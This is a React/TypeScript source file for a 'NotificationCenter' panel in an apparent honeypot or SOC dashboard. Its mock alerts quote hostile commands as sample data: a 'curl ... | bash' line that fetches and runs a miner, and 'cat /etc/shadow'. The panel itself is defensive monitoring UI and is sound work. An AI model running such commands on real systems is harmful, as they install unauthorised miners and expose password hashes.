import React, { useState } from 'react';
import { 
  Bell, X, Check, ShieldAlert, AlertTriangle, Info, Settings, 
  Moon, CheckCircle2, Trash2, Filter, Volume2, VolumeX
} from 'lucide-react';

export interface AlertNotification {
  id: string;
  category: 'critical' | 'warning' | 'system';
  title: string;
  message: string;
  time: string;
  read: boolean;
}

interface NotificationCenterProps {
  isOpen: boolean;
  onClose: () => void;
  onOpenRuleBuilder: () => void;
}

export const NotificationCenter: React.FC<NotificationCenterProps> = ({ isOpen, onClose, onOpenRuleBuilder }) => {
  const [filter, setFilter] = useState<'all' | 'critical' | 'warning' | 'system'>('all');
  const [quietHours, setQuietHours] = useState(false);
  
  const [notifications, setNotifications] = useState<AlertNotification[]>([
    {
      id: 'notif-1',
      category: 'critical',
      title: 'Mirai Botnet Telnet Exploit Blocked',
      message: 'Trapped payload: curl -s http://193.142.x.x/miner | bash from IP 193.142.146.210 (Threat: 95/100).',
      time: '2m ago',
      read: false
    },
    {
      id: 'notif-2',
      category: 'critical',
      title: 'Password Shadow File Exfiltration Attempt',
      message: 'Attacker executed cat /etc/shadow on decoy port 23; honeytokens served safely.',
      time: '6m ago',
      read: false
    },
    {
      id: 'notif-3',
      category: 'warning',
      title: '5 Consecutive Failed Admin Logins',
      message: 'Gateway access rate limiter activated for IP 103.253.42.18 for 15 minutes.',
      time: '18m ago',
      read: false
    },
    {
      id: 'notif-4',
      category: 'system',
      title: 'SQLite WAL Hot Online Snapshot Created',
      message: 'Forensic snapshot cyvantis_backup_20261011.db.bak verified with 0 corruption flags.',
      time: '34m ago',
      read: true
    },
    {
      id: 'notif-5',
      category: 'system',
      title: 'WebSocket Telemetry Re-synced',
      message: 'Persistent sub-12ms event stream connected to SOC dashboard.',
      time: '1h ago',
      read: true
    }
  ]);

  if (!isOpen) return null;

  const unreadCount = notifications.filter(n => !n.read).length;

  const markAllAsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })));
  };

  const clearAll = () => {
    setNotifications([]);
  };

  const filteredNotifications = notifications.filter(n => {
    if (filter === 'all') return true;
    return n.category === filter;
  });

  return (
    <div 
      role="dialog"
      aria-modal="true"
      aria-label="Notification Center"
      className="fixed inset-0 z-[160] bg-black/75 backdrop-blur-sm flex justify-end"
      onClick={onClose}
    >
      <div 
        className="bg-[#050b1f] border-l border-[#00d2ff]/40 w-full max-w-md h-full flex flex-col shadow-2xl font-sans"
        onClick={e => e.stopPropagation()}
      >
        {/* Header */}
        <div className="p-5 border-b border-slate-800 bg-[#030716] flex items-center justify-between shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-xl bg-[#00d2ff]/10 text-[#00d2ff]">
              <Bell className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-base font-black text-white font-mono flex items-center gap-2">
                Alert Hub
                {unreadCount > 0 && (
                  <span className="px-2 py-0.5 rounded-full bg-red-500 text-white text-[10px] font-bold">
                    {unreadCount} new
                  </span>
                )}
              </h3>
              <p className="text-[11px] text-slate-400 font-mono">SOC real-time notification engine</p>
            </div>
          </div>

          <button 
            onClick={onClose}
            className="text-slate-400 hover:text-white p-2 rounded-lg"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Filter Bar & Controls */}
        <div className="px-5 py-3 border-b border-slate-800 bg-[#04081c] flex items-center justify-between text-xs font-mono">
          <div className="flex items-center gap-1.5">
            {(['all', 'critical', 'warning', 'system'] as const).map(cat => (
              <button
                key={cat}
                onClick={() => setFilter(cat)}
                className={`px-2.5 py-1 rounded-lg uppercase text-[10px] font-bold ${
                  filter === cat ? 'bg-[#00d2ff] text-black' : 'text-slate-400 hover:text-white bg-slate-900'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          <button
            onClick={markAllAsRead}
            className="text-[#00d2ff] hover:underline text-[11px] font-bold"
          >
            Mark read
          </button>
        </div>

        {/* Quiet Hours & Rule Builder Banner */}
        <div className="px-5 py-2.5 bg-[#020512] border-b border-slate-800 flex items-center justify-between text-xs font-mono">
          <button
            onClick={() => setQuietHours(prev => !prev)}
            className={`flex items-center gap-1.5 text-[11px] px-2.5 py-1 rounded-lg border ${
              quietHours ? 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40' : 'bg-slate-900 text-slate-400 border-slate-800'
            }`}
          >
            {quietHours ? <VolumeX className="w-3.5 h-3.5" /> : <Volume2 className="w-3.5 h-3.5" />}
            <span>Quiet Hours (2AM - 6AM)</span>
          </button>

          <button
            onClick={() => { onClose(); onOpenRuleBuilder(); }}
            className="text-cyan-400 hover:underline flex items-center gap-1 text-[11px]"
          >
            <Settings className="w-3.5 h-3.5" />
            <span>Rules</span>
          </button>
        </div>

        {/* Notification List */}
        <div className="flex-1 overflow-y-auto p-4 space-y-2.5">
          {filteredNotifications.length === 0 ? (
            <div className="py-16 text-center text-slate-500 font-mono text-xs space-y-2">
              <CheckCircle2 className="w-8 h-8 text-emerald-500/60 mx-auto" />
              <p>No notifications matching this filter</p>
            </div>
          ) : (
            filteredNotifications.map(notif => (
              <div 
                key={notif.id}
                className={`p-3.5 rounded-2xl border transition-all ${
                  notif.read ? 'bg-[#020512] border-slate-800/80 text-slate-400' : 'bg-[#08122c] border-[#00d2ff]/40 text-slate-200 shadow-md'
                }`}
              >
                <div className="flex items-start justify-between gap-2 mb-1">
                  <div className="flex items-center gap-2">
                    {notif.category === 'critical' ? (
                      <ShieldAlert className="w-4 h-4 text-red-400 shrink-0" />
                    ) : notif.category === 'warning' ? (
                      <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
                    ) : (
                      <Info className="w-4 h-4 text-cyan-400 shrink-0" />
                    )}
                    <h4 className="font-bold text-white font-mono text-xs">{notif.title}</h4>
                  </div>
                  <span className="text-[10px] text-slate-500 font-mono shrink-0">{notif.time}</span>
                </div>
                <p className="text-xs text-slate-300 font-sans leading-relaxed pl-6">
                  {notif.message}
                </p>
              </div>
            ))
          )}
        </div>

        {/* Footer */}
        <div className="p-4 border-t border-slate-800 bg-[#020510] flex items-center justify-between text-xs font-mono">
          <button
            onClick={clearAll}
            className="text-slate-500 hover:text-red-400 flex items-center gap-1.5 transition text-[11px]"
          >
            <Trash2 className="w-3.5 h-3.5" />
            <span>Clear alerts</span>
          </button>
          <span className="text-slate-500 text-[10px]">Updated live via WebSocket</span>
        </div>
      </div>
    </div>
  );
};
